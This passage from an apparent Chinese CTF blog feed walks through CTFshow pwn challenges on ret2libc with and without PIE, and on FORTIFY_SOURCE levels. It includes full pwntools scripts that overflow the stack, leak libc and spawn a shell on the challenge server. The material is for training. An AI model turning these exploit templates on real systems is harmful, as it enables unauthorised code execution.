punctuation\">(</span>asc_8048800<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_804888C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_804891C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_80489A0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_8048A34<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>aClassifyCtfsho<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Type  : Linux_Security_Mechanisms                               \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Site  : https://ctf.show/                                       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Hint  : No Canary found &amp; No PIE \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello CTFshow!\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>查看 ctfshow 函数，发现可以进行栈溢出：<br />\n<img data-src=\"https://img1.imgtp.com/2023/10/05/RFz1ou85.png\" alt=\"\" /></p>\n<p>没有后门那就利用 <code>ret2libc</code>  来 getshell（与 pwn25 完全相同）</p>\n<h2 id=\"exp直接利用pwn25的exp就行\"><a class=\"anchor\" href=\"#exp直接利用pwn25的exp就行\">#</a> exp (直接利用 pwn25 的 exp 就行):</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./32libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn25')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn25'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28282</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>read_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x080484F6</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"wiret=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img1.imgtp.com/2023/10/05/qwGt3PBO.png\" alt=\"\" /></p>\n<h1 id=\"pwn31aslr和pie都开启\"><a class=\"anchor\" href=\"#pwn31aslr和pie都开启\">#</a> pwn31 (ASLR 和 PIE 都开启)</h1>\n<h2 id=\"题目-25\"><a class=\"anchor\" href=\"#题目-25\">#</a> 题目：</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjdcm6.png\" alt=\"\" /></p>\n<p>32 位程序，PIE 开启<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjdhfH.png\" alt=\"\" /></p>\n<p>因为开启了 PIE 所以 main 函数地址也会变，就不能直接利用上面的 main 函数地址，但是源码有个打印 main 函数地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjwCn0.png\" alt=\"\" /></p>\n<p>但是因为开启了 PIE，其他函数地址也同样在变化，那么我们就无法从 ELF 中得到函数的 got 和 plt 地址，需要通过上面得到的 main 函数的真实地址来获得基址：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>base<span class=\"token operator\">=</span>main<span class=\"token operator\">-</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>通过得到的基址再算出各个函数的 plt 和 got 地址：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>write_plt<span class=\"token operator\">=</span>base<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>write_got<span class=\"token operator\">=</span>base<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>注意这里 ebx 的值也要考虑（原因还不清楚）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ebx<span class=\"token operator\">=</span>base <span class=\"token operator\">+</span> <span class=\"token number\">0x1fc0</span> <span class=\"token punctuation\">(</span>got表的地址<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">132</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"aaaa\"</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>show_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>其他方面基本一致</p>\n<h2 id=\"exp-2\"><a class=\"anchor\" href=\"#exp-2\">#</a> exp:</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./32libc-2.27.so\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#libc 版本要考虑进去</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn31'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28198</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"main:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset<span class=\"token operator\">=</span>main<span class=\"token operator\">-</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>write_plt<span class=\"token operator\">=</span>offset<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>write_got<span class=\"token operator\">=</span>offset<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#read_plt=offset+e.symbols[\"read\"]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#read_got=offset+e.got[\"read\"]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>show_add<span class=\"token operator\">=</span>offset<span class=\"token operator\">+</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"ctfshow\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ebx<span class=\"token operator\">=</span>offset<span class=\"token operator\">+</span><span class=\"token number\">0x1fc0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#ebx=0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">132</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"aaaa\"</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>show_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#这里的 ebx 不能变</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>show_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPj2CRK.png\" alt=\"\" /></p>\n<h1 id=\"pwn32fortify\"><a class=\"anchor\" href=\"#pwn32fortify\">#</a> pwn32（FORTIFY）</h1>\n<p><code>FORTIFY_SOURCE=0</code>  意味着没有开启保护，不会检查栈溢出漏洞</p>\n<h2 id=\"题目-26\"><a class=\"anchor\" href=\"#题目-26\">#</a> 题目：</h2>\n<p>（是 ssh 连接）<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjR27j.png\" alt=\"\" /></p>\n<p>64 位程序除了 canary 其他都开了</p>\n<p>main 函数：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPj57Tg.png\" alt=\"\" /></p>\n<p>undefined 函数（发现可以得到 flag）：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPj5Lfs.png\" alt=\"\" /></p>\n<p>想要得到 flag 需要 <code>argc &gt; 4</code> ，我们直接传三个参数，第一个参数 <code>大于4</code>  即可</p>\n<p>连接 ssh 后输入:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>pwnme <span class=\"token number\">5</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span>  #这里的<span class=\"token number\">5</span>为<span class=\"token keyword\">int</span> agrc；至于为什么是<span class=\"token number\">4</span>个参数才行不太明白，<span class=\"token number\">3</span>个参数就不行</pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjIE11.png\" alt=\"\" /></p>\n<h1 id=\"pwn33fortify\"><a class=\"anchor\" href=\"#pwn33fortify\">#</a> pwn33(FORTIFY)</h1>\n<p><code>FORTIFY_SOURCE=1</code> ：在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。</p>\n<h2 id=\"题目-27\"><a class=\"anchor\" href=\"#题目-27\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjI81I.png\" alt=\"\" /></p>\n<p>查看保护，64 位程序</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjIgBT.png\" alt=\"\" /></p>\n<p>ida 查看，发现开启了 FORTIFY 后有变化：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjIh4J.png\" alt=\"\" /></p>\n<p>这是因为 <code>FORTIFY</code>  开启后会对其函数进行长度检查，导致无法进行溢出，但是格式化字符串 <code>%2%x</code>  和 <code>%n</code>  仍然可以用</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjo5dS.png\" alt=\"\" /></p>\n<h1 id=\"pwn34fortify\"><a class=\"anchor\" href=\"#pwn34fortify\">#</a> pwn34（FORTIFY）</h1>\n<p><code>FORTIFY_SOURCE=2</code>  启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</p>\n<h2 id=\"题目-28\"><a class=\"anchor\" href=\"#题目-28\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjozoF.png\" alt=\"\" /></p>\n<p>可以发现开启了 <code>FORTIFY_SOURCE=2</code>  时，格式化字符串也进行了检查</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/10/07/G70N0dHS.png\" alt=\"\" /></p>\n<p>格式化字符串失败：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjTfp9.png\" alt=\"\" /></p>\n<p>获得 flag：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/07/pPjT5Ox.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}